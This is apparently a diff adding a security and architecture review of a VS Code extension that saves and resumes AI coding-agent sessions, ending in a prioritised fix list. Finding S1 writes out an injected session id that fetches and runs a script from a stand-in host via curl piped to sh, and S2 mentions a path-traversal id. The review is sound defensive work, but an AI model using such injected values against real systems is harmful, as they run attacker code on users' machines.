@@ -1,0 +1,129 @@
+# Architecture & Security Review — Agent Session Keeper 0.0.1
+
+Review date: after milestone M7, commit `65a34e4` (repo matches `github.com/dbaralt/agent-session-keeper`).
+
+**Verified by the reviewer:** `npm run build` ✅ · `npm test` (155 unit tests) ✅ · `npm run test:integration` (16 integration tests, fake agents, temp dirs) ✅ · inspected the packaged `agent-session-keeper-0.0.1.vsix` contents · read every file in `src/`, `resources/`, `media/`, `scripts/`, `test/bin/`, plus manifest and build config.
+
+---
+
+## Part 1 — Architecture review
+
+### What is solid
+
+- **Clean layering.** `agents/` (adapters + registry), `capture/` (monitor, watcher, spool, correlator), `store/` (atomic JSON store + lock), `restore/`, `ui/`, `import/` are well separated, and the `AgentAdapter` interface keeps agent specifics in two files. Adding an agent really is one file + one registry line.
+- **Store correctness.** One JSON file per `agent/sessionId`, atomic tmp+rename writes, cross-process mkdir lock, field-level merge by `updatedAt`, and a debounce-refreshed `fs.watch` for cross-window visibility. There is a dedicated concurrency test that runs two real writer processes.
+- **Input validation on disk reads.** `isSessionRecord` structural checks + `normalizeRecord` (only known keys are copied) + `sessionFileName()` sanitises session ids into safe filenames, so records read from disk cannot cause path traversal on write.
+- **Graceful degradation everywhere.** Watchers fall back to non-recursive watch, the spool reader tolerates bad lines, hooks never fail the agent, the extension logs store init failure and keeps running.
+- **No runtime dependencies, no network access, no telemetry.** Good for auditability and the marketplace.
+
+### Findings (numbered for the fix list)
+
+**A1 — Multi-window startup race falsely marks live sessions "interrupted" (correctness bug).**
+`detectInterrupted` (`src/restore/interrupted.ts`) only knows about *this window's* terminals. When window B starts while window A has running sessions, B marks A's sessions `interrupted`, B's startup prompt offers to restore sessions that are still alive in A, and restoring them spawns duplicate agents. Window A eventually flips them back to `running` on the next transcript write, but until then both windows show wrong state. Fix: add a cheap liveness heartbeat — each window writes `<storageDir>/windows/<vscode.env.sessionId>.json` (mtime refreshed every ~30 s while the window lives) — and `detectInterrupted` treats records whose `launch.windowSessionId` maps to a *fresh* heartbeat as still running. Clean up stale heartbeats on activate.
+
+**A2 — Unbounded spool growth and O(file) re-reads.**
+`~/.agent-sessions/spool/events-YYYY-MM-DD.jsonl` is append-only and never pruned, and `HookSpoolReader.poll()` (`src/capture/HookSpoolReader.ts`) calls `readFile(file)` — the *whole* file — on every 500 ms poll of every spool file. A busy day of sessions makes each poll read and slice tens of MB. Fix: (a) open a persistent file handle per spool file and read incrementally from the stored offset (`fs.read` with a position), or at minimum keep the readFile but add (b) retention: on startup and daily, delete spool files whose date is older than N days (N = 7 by default, maybe a setting `agentSessions.spoolRetentionDays`).
+
+**A3 — `settings.json` written non-atomically and without a lock.**
+`HooksInstaller.installClaudeHooks`/`uninstallClaudeHooks` (`src/hooks/installer.ts`) write the user's `~/.claude/settings.json` with a plain `writeFile`. A crash or power loss mid-write corrupts the user's Claude config (the `.bak` only helps if the file still exists). Two VS Code windows running install/uninstall concurrently can also interleave. Fix: reuse `writeJsonAtomic` (it already exists in `src/store/atomicWrite.ts`) plus `withFileLock` on a `settings.json.lock`, same pattern as the session store.
+
+**A4 — Unhandled promise rejections in event paths.**
+`TerminalMonitor` (`void this.onStart(event)`), the `onEvent` callbacks wired in `extension.ts` (`void correlator.onSessionFile(...)`, `void correlator.onHookEvent(...)`), and `void startup.run()` all fire-and-forget. Any throw inside (e.g. a lock timeout from `withFileLock`, an EACCES) becomes an unhandled rejection logged by VS Code, and the failure is invisible to the user. Fix: wrap each callback body in try/catch that logs via `log().error(...)`; same for `startup.run()`.
+
+**A5 — Launcher pre-commits a `running` record that may never exist.**
+`Launcher.launch` writes a full record (status `running`) *before* the command executes. If the agent binary is missing or exits immediately, a ghost `running` record remains, which the startup flow later offers as "interrupted" and the resume flow then marks `missing`. Acceptable for a personal tool, but cheap to improve: write status `pending` and let capture flip it to `running` when the session file appears (the model already has a `pending` status; `SessionTreeProvider` already shows it under "Running").
+
+**A6 — `bind()` unconditionally sets `status: 'running'`.**
+An archived session that is resumed from a plain terminal (hook event or session file with a matching terminal) gets silently un-archived and its title can be overwritten (unless `titleSource === 'user'`). Decide: skip `bind` (fall back to `touchExisting`) for records with `status === 'archived'`, or document the behaviour.
+
+**A7 — `showTerminal` matches terminals by `name.includes(record.title)`.**
+`SessionCommands.showTerminalRecord` can reveal the wrong terminal when one title is a substring of another (the uniquifier makes `Session (2)` contain `Session`). Improve: keep a `vscode.Terminal` reference per bound terminal key in the correlator (or a `Map` from `sessionKey` to terminal) and show that exact terminal; keep the name match as fallback only.
+
+**A8 — Small items (fix opportunistically).**
+- `withFileLock` (`src/store/lock.ts`): two waiters can both `rm` a stale lock and both acquire. Low risk (both writers still merge field-level), but an easy hardening is to re-check `mkdir` immediately after stealing.
+- `SessionStore.findKeyByPath` is an O(n) scan per file event; fine for hundreds of records, note only.
+- `resources/pi-extension.ts`: `mkdirSync(join(spoolFile(), ".."))` calls `spoolFile()` twice (date could roll over between the two calls) and derives the dir from the *file* path. Compute the spool dir once and `join(dir, filename)` from it.
+- `SessionDirWatcher.preload` and `importExisting.walk` walk every project dir under `~/.claude/projects` at startup — with a large history this is a slow first activation. Acceptable; consider lazy import.
+- `store.init()` failure leaves the extension fully active with a broken store; every later store call throws. Consider a degraded mode flag (skip capture) or surfacing the error in the UI once.
+
+---
+
+## Part 2 — Security review
+
+### What is solid
+
+- **No `eval`, no `Function`, no dynamic `require`, no network code, no runtime deps.** The only `child_process` uses are `execFileSync('ps', ...)` in the hook bridge with fixed argv (no shell), and `spawnSync('code', ...)` in the sandbox script.
+- **Webview is well built.** CSP restricts scripts to the webview origin, no `innerHTML` anywhere in `media/history.js` (all DOM built with `textContent`), messages are validated and switch-dispatched, `localResourceRoots` limited to `media/`.
+- **Records read from disk are structurally validated** and filenames are sanitised, so a corrupted or hand-crafted record can't traverse paths on *write*.
+- **The design keeps the user in control:** hooks are opt-in, uninstall is byte-identical to the pre-install state (verified by test), prompts-as-titles is an explicit setting with a secrets warning.
+
+### Findings (numbered for the fix list)
+
+**S1 — Shell injection through resume-command template substitution (highest priority).**
+`applyResumeTemplate` (`src/agents/AgentAdapter.ts`) inserts `record.sessionId`, `record.cwd` and `record.title` **raw** into a command string, and `Restorer.resume` executes that string in the user's shell (`integration.executeCommand` / `terminal.sendText`). The values come from:
+- `sessionId`: a launcher UUID (safe) — but also `explicitSessionId` parsed from *any* command line the shell-integration reports (a malicious workspace's `tasks.json` or script can run `claude --resume 'x; curl evil.example | sh'` in the integrated terminal, and the extension will faithfully record that id), and `session_id` from the **spool**, which any local process can append to.
+- `title`: taken from the transcript (`customTitle`/`title`) or the **first prompt** — both can be influenced by prompt injection ("set the session title to ..."), so the title is not user-trusted text.
+
+A crafted id or title containing `` ` ``, `$()`, `;` etc. ends up in `claude --resume <id>` and executes when the user clicks Resume. Fix (defence in depth, all three):
+1. Validate session ids at capture time and at resume time: reject records whose `sessionId` doesn't match `/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/` (real agents use UUIDs; this still allows file-friendly ids). Apply in `Correlator.bind`, `onHookEvent`, and as a guard in `Restorer.resume` + `SessionCommands.copy`.
+2. Shell-quote every substitution in `applyResumeTemplate` (quote for POSIX sh: wrap in single quotes and escape embedded quotes; skip quoting only if the value matches the safe pattern above). `buildNewCommand`'s `JSON.stringify(name)` has the same gap for `$`/backticks — quote it too.
+3. When `buildResumeCommand` output contains shell metacharacters *outside* the quoted parts, log it and show the command for confirmation before sending it to the terminal.
+
+**S2 — Path traversal in transcript lookup via unsanitised `sessionId`.**
+`createClaudeAdapter.transcriptPathFor` does `path.join(projects, dir, `${record.sessionId}.jsonl`)` with the raw record id; a record with `sessionId = '../../...'` (hand-edited or spool-injected) can make the extension read/open a `.jsonl` outside `~/.claude/projects`. Impact is minor (local read + display), but the same S1 validation fixes it; additionally, resolve the joined path and check it `isUnder` the projects root (pattern already exists in `SessionDirWatcher.isUnder`).
+
+**S3 — Storage directory and files are created with default permissions (0755/0644).**
+`~/.agent-sessions` holds session ids, cwds, git branches, terminal ids, and possibly prompt-derived titles (which the settings themselves warn may contain secrets). On a multi-user machine any local user can read them, and anyone who can write `storageDir/bin/hook.js` gets code execution inside every Claude session (the hook is invoked by Claude with the user's privileges). Fix: create the storage root, `sessions/`, `spool/` and `bin/` with mode `0700` (files `0600`), and make the installer `chmod 0700` an already-existing storage dir on install. Also verify the copied `hook.js` is `0755` but the dir is `0700`.
+
+**S4 — Fake agents can fall back to writing real `~/.claude` / `~/.pi`.**
+`test/bin/claude` and `test/bin/pi` use `process.env.CLAUDE_CONFIG_DIR || path.join(os.homedir(), '.claude')`. If someone runs them outside the sandbox/integration harness (env not set), they create fake project entries in the *real* agent config — violating the project's own safety rule. Fix: in both scripts, `if (!process.env.CLAUDE_CONFIG_DIR /* resp. PI_CODING_AGENT_DIR */) { console.error('refusing to run without CLAUDE_CONFIG_DIR pointing at a throwaway folder'); process.exit(1); }`.
+
+**S5 — Hook installer trusts the storage dir from the env var at install time.**
+`HooksInstaller` writes `node <storageDir>/bin/hook.js claude` into `settings.json`. If `AGENT_SESSIONS_STORAGE_DIR` points somewhere shared (a synced folder, a world-writable path), every Claude session will execute whatever lands at that path. Not exploitable remotely, but worth a guard: on install, warn if the resolved storage dir is not inside the user's home and/or not mode `0700`.
+
+**S6 — Cosmetic injection surfaces (low, worth hardening anyway).**
+- `SessionTreeProvider.tooltip` builds a `MarkdownString` from `record.title`/`cwd`. With `isTrusted` unset it can't run commands, but crafted titles can spoof formatting/links in the hover. Use `new MarkdownString(...)` with the text appended via `appendText()` for the untrusted parts, or escape backticks.
+- `SessionCommands.copy` shows the built command in an information message — fine (it's a code span), but after S1 quoting this becomes a place to *show* the quoting.
+- The hook bridge's `ps`-based ancestor walk can't work on Windows (`ps` missing) — not a security issue, capture then relies on `AGENT_SESSIONS_TERMINAL_ID`; document it.
+
+**S7 — No security-relevant issues found in:** the webview (CSP + `textContent`), the lock/atomic-write code, the command tokenizer (it only *parses*, never executes), `importExisting` (read-only walk under agent roots), or the sandbox script (all data dirs overridden, `--reset` only touches `.sandbox/`).
+
+---
+
+## Part 3 — Publishing / packaging review
+
+**P1 — Extra files ship in the VSIX.** The packaged `agent-session-keeper-0.0.1.vsix` contains `tsconfig.json`, `esbuild.mjs`, `PROGRESS.md`, `AGENTS.md`, `CLAUDE.md`, `START_HERE.md`. Add them to `.vscodeignore` (keep `readme.md`, `resources/`, `media/`, `dist/extension.js`, `resources/pi-extension.ts`).
+
+**P2 — Marketplace metadata gaps in `package.json`:**
+- no `repository` field (you already have `https://github.com/dbaralt/agent-session-keeper`; adding it also removes the need for `--allow-missing-repository`);
+- no `icon` (marketplace requires a 128×128 PNG, not SVG);
+- no `keywords`, no `LICENSE` file even though `license: MIT` is declared;
+- remove `"private": true` — it's meaningless for a VSIX and some tooling treats it as non-distributable;
+- consider `"preview": true` while at 0.x.
+
+**P3 — `engines.vscode: ^1.93.0`** — correct for the stable `window.onDidStartTerminalShellExecution` API family you use; no change needed, just keep it in sync if you adopt newer APIs.
+
+---
+
+## Part 4 — Prioritised fix list for a coding agent
+
+Apply in this order. Each item is independently committable.
+
+1. **[S1+S2] Session-id validation + shell quoting of template substitutions.**
+   - Add `isSafeSessionId(id)` (pattern above) to `src/model/types.ts`; reject in `Correlator.bind` / `onHookEvent` (drop the event, log a warning) and guard `Restorer.resume`, `SessionCommands.copy` and both adapters' `transcriptPathFor` (also `isUnder` check).
+   - Add a `shellQuote()` helper (single-quote + `'\''` escaping for POSIX; no-op for values matching the safe pattern) and use it for `${sessionId}`, `${cwd}`, `${title}` in `applyResumeTemplate` and for the name in both `buildNewCommand`s. Unit-test: id/title containing `` ` ``, `$()`, `;`, quotes must survive round-trip as a single shell word.
+2. **[S3] Restrictive permissions for storage.** `0700` for `~/.agent-sessions` (and `sessions/`, `spool/`, `bin/`), `0600` for record + spool files (`writeFileAtomic` gains an optional `mode`), installer re-chmods on install. Unit-test the created modes.
+3. **[A3] Atomic + locked writes of `settings.json`** in `HooksInstaller` (reuse `writeJsonAtomic` + `withFileLock`). Add a concurrency test if cheap.
+4. **[A1] Multi-window liveness heartbeat** (`windows/<sessionId>.json`, mtime refreshed on an interval, checked by `detectInterrupted`). Extend `test/unit/interrupted.test.ts`.
+5. **[A4] try/catch every fire-and-forget event callback** (`TerminalMonitor.onStart`, both `onEvent` lambdas in `extension.ts`, `startup.run`) logging to the output channel.
+6. **[A2] Spool retention + incremental reads.** Delete spool files older than `agentSessions.spoolRetentionDays` (default 7) on startup; switch `HookSpoolReader` to position-based `fs.read` or at least keep offsets per file handle. Test with a fake clock.
+7. **[S4] Fake agents refuse to run without their env vars** (`test/bin/claude`, `test/bin/pi`, and the `.cmd` shims).
+8. **[P1] `.vscodeignore`:** add `tsconfig.json`, `esbuild.mjs`, `PROGRESS.md`, `AGENTS.md`, `CLAUDE.md`, `START_HERE.md`, `REVIEW.md`.
+9. **[P2] Manifest + repo hygiene:** add `repository`, `keywords`, `icon` (PNG), a `LICENSE` file, drop `private: true`; keep `--allow-missing-repository` only until `repository` is added.
+10. **[A5] Launcher writes `pending`** until capture confirms the session file; flip to `running` in `bind`/`touchExisting`.
+11. **[A6] Decide archived-on-resume behaviour** (recommend: `bind` skips archived records, falls through to `touchExisting`) and record it in `PROGRESS.md` under Decisions.
+12. **[A7] `showTerminal` exact-match by stored terminal reference**, substring name match as fallback.
+13. **[S6] Tooltip hardening:** build the `MarkdownString` with `appendText()` for title/cwd.
+14. **[A8] Small hardenings:** stale-lock re-check after steal; `pi-extension.ts` spool-dir refactor; optional degraded-store mode.
+
+**Explicitly not problems** (do not "fix"): the mkdir-based lock design, the global `~/.agent-sessions` default (owner-confirmed decision D2), JSON-per-record storage, polling spool reader (beyond item 6), the absence of Codex support (decision D4).
